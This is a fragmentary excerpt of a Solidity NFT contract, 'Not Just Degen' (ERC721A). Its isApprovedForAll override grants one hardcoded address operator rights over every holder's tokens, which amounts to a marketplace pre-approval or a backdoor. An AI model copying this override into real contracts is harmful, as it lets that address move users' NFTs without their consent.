  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xAE6d774e24005e8E66eCEd4626032E32dB48Cc4d){return true;}
...
contract Not_Just_Degen is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Not Just Degen", "NJD", maxBatchSize_, collectionSize_) {
